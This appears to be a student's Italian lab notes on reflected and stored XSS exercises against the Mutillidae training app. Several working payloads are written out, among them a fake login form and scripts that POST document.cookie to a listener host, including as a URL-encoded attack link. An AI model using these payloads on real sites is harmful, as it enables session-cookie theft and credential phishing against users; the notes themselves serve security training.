## Esercizio 1
Iniezione di un'immagine tramite input text disponibile sulla pagina.

Prima di tutto, come si fa a verificare che una pagina sia soggetta a XSS?
> provare ad inserire codice html oppure javascript. magari anche analizzare il codice sorgente.

Inserendo vari tag html, provando anche a inserire il tag `script` e a generare un alert, per capire se è possibile iniettare codice JavaScript.

```html
	<img src="http://upload.wikimedia.org/wikipedia/en/b/bc/Wiki.png" />
```


## Esercizio 2
Viene richiesto di inserire un form all'interno della pagina.

```html
<form>
	<h1>Prova form</h1>
	<input type="text" name="user" id="user" />
	<input type="button" name="login" value="Login" id="login" onclick="" />
</form>
```


## Esercizio 3
Intanto si richiede di prendere i cookie di sessione di un'utente.
```js
<script> 
alert(document.cookie);
	</script>
```

```js
fetch("http://192.168.1.33:8080/", {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ "name": "<script>document.cookie</script>" })
}).then(response => response.json()).then(response => console.log(JSON.stringify(response)))


```

OPPURE, più semplicemente:
```js
<script>
fetch("http://192.168.1.33:8080", {
  method: "POST",
  mode: "no-cors",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "cookie=" + document.cookie
});
</script>
```

==ATTENZIONE : il problema potrebbe stare sul fatto che quella pagina, user-info, è iniettabile ma devi far attenzione ai parametri:

Provare prima con : `<script>alert(1)</script>` e controllare l'url per vedere dove viene iniettato lo script.

infatti si inietta in `http://192.168.122.182/mutillidae/index.php?page=user-info.php&username=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details`

Se togli il resto, lo script non funziona, FAI ATTENZIONE.
Dopodichè, basta encodare uno degli script di sopra e inserirlo in quella posizione:

```js
http://192.168.122.182/mutillidae/index.php?page=user-info.php&username=%3Cscript%3E%0Afetch%28%22http%3A%2F%2F127.0.0.1%3A8080%22%2C%20%7B%0A%20%20method%3A%20%22POST%22%2C%0A%20%20mode%3A%20%22no-cors%22%2C%0A%20%20headers%3A%20%7B%0A%20%20%20%20%22Content-Type%22%3A%20%22application%2Fx-www-form-urlencoded%22%0A%20%20%7D%2C%0A%20%20body%3A%20%22cookie%3D%22%20%2B%20document.cookie%0A%7D%29%3B%0A%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details
```

Infine, eseguire il server tramite : `python3 server.py 8080`



## Esercizio 2 XSS - STORED
Per questa tipologia di esercizi si può fare riferimento alla pagina (A3 - Cross Site Scripting (XSS) -> Persistent (Second Ordert) -> Add to our blog).

Come primo passo occorre valutare se la pagina è effettivamente soggetta a vulnerabilità di tipo XSS Injection di tipo persistente

### Esercizio 2.1 
Caricare un'immagine
```js
<img src="https://cdn.pixabay.com/photo/2024/10/02/18/24/leaf-9091894_960_720.jpg" />
```

### Esercizio 2.2
Inserire un `form`.

```js
<form id="injectedform">
	<br><br><HR><H3>This feature requires account login:</H3 >
	<br><br>Enter Username:<br>
	<input type="text" id="user" name="user">
	<br>Enter Password:<br>
	<input type="password" name = "pass">
	<br><input type="button" name="login" value="login" onclick="hack()" />
</form>
<br><br><HR>
```


### Esercizio 3
Stessa logica dell'esercizio 3 del reflected. Mandare una richiesta con i cookie
```js
Ciao
<script>
fetch("http://192.168.1.33:8080", {
  method: "POST",
  mode: "no-cors",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "cookie=" + document.cookie
});
</script>
```

Notare che script non appare, però solo la scritta ciao. in realtà, appena qualcuno si collega, a me arrivano i cookie.

